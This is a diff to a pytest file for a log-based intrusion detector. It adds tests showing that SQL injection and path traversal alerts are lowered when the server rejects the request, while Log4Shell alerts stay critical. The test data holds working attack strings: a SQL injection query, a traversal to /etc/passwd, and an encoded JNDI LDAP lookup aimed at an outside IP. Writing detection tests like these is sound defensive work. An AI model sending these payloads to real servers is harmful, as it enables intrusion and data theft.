@@ -8,6 +8,7 @@ in a search box as SQL injection, a Jenkins build step as a webshell, a Go test
 binary as a dropper."""
 import asyncio
 import glob
+import itertools
 import os
 import sys
 
@@ -65,13 +66,22 @@ def exec_alerts(engines, image, cmd, parent="", comm=""):
     return _eval(sig, dict(event, raw_message=line, log_type="linux_process_exec", hostname="web-1"))
 
 
-def web_alerts(engines, path, referrer="-"):
+_REQUEST = itertools.count(1)
+
+
+def web_matches(engines, path, referrer="-", status=200):
     dec, sig = engines
-    ip = f"45.9.{len(path) % 250}.{sum(map(ord, path)) % 250 + 1}"  # one IP per request: no suppression
-    line = (f'{ip} - - [20/Oct/2026:09:00:00 +0700] "GET {path} HTTP/1.1" 200 150 "{referrer}" '
+    n = next(_REQUEST)
+    ip = f"45.9.{n // 250}.{n % 250 + 1}"  # one IP per request: rule suppression would hide repeats
+    line = (f'{ip} - - [20/Oct/2026:09:00:00 +0700] "GET {path} HTTP/1.1" {status} 150 "{referrer}" '
             '"Mozilla/5.0 (X11; Linux x86_64)"')
     event = dec.decode("nginx_access_combined", line)
-    return _eval(sig, dict(event, raw_message=line, log_type="nginx_access_combined"))
+    return {m["title"]: m for m in asyncio.run(sig.evaluate(dict(event, raw_message=line,
+                                                                   log_type="nginx_access_combined")))}
+
+
+def web_alerts(engines, path, referrer="-", status=200):
+    return {t: m["level"] for t, m in web_matches(engines, path, referrer, status).items()}
 
 
 @pytest.mark.parametrize("cmd,title", [
@@ -167,3 +177,37 @@ def test_go_toolchain_binaries_are_not_temp_droppers(engines, image):
 @pytest.mark.parametrize("image", ["/tmp/k", "/dev/shm/x", "/tmp/go-build1/evil", "/tmp/go-build1/b1/exe/sub/x"])
 def test_programs_run_from_temp_still_fire(engines, image):
     assert TEMP_EXEC in exec_alerts(engines, image, image)
+
+
+LFI = "Access to /etc/passwd"
+LOG4SHELL = "Log4Shell JNDI Lookup In A Web Request (CVE-2021-44228)"
+SQLI_PATH = "/item?id=1'+AND+(SELECT+COUNT(*)+FROM+users)>0--"
+LFI_PATH = "/index.php?page=../../../../etc/passwd"
+JNDI_PATH = "/x?u=%24%7Bjndi%3Aldap%3A%2F%2F45.9.20.1%2Fa%7D"
+
+
+@pytest.mark.parametrize("path,title,level", [(SQLI_PATH, SQLI, "high"), (LFI_PATH, LFI, "high")])
+def test_a_payload_the_server_turned_away_is_one_level_lower(engines, path, title, level):
+    lower = {"critical": "high", "high": "medium"}[level]
+    for status in (200, 500, 302):
+        assert web_alerts(engines, path, status=status)[title] == level, status
+    for status in (404, 403, 400, 405, 429):
+        m = web_matches(engines, path, status=status)[title]
+        assert (m["level"], m["http_outcome"], m["http_status"]) == (lower, "rejected", status)
+
+
+def test_log4shell_keeps_its_level_on_a_404(engines):
+    assert web_alerts(engines, JNDI_PATH, status=404)[LOG4SHELL] == "critical"
+
+
+def test_only_single_request_payload_web_rules_follow_the_status():
+    from worker.sigma_engine import _http_outcome_adjusts
+    docs = {d["title"]: d for f in glob.glob(os.path.join(ROOT, "rules/*.yaml"))
+            for d in yaml.safe_load_all(open(f)) if isinstance(d, dict) and "detection" in d}
+    adjusts = lambda t: _http_outcome_adjusts(docs[t], docs[t].get("logsource") or {})  # noqa: E731
+    assert adjusts(SQLI) and adjusts(LFI)
+    for title in (LOG4SHELL,                                                   # opted out
+                  "Repeated HTTP 401 Unauthorized (Web Auth Brute Force)",     # about the status
+                  "WAF Blocking Repeated Attacks From One Source",             # about volume
+                  WEB_SHELL):                                                  # not a web log rule
+        assert not adjusts(title), title
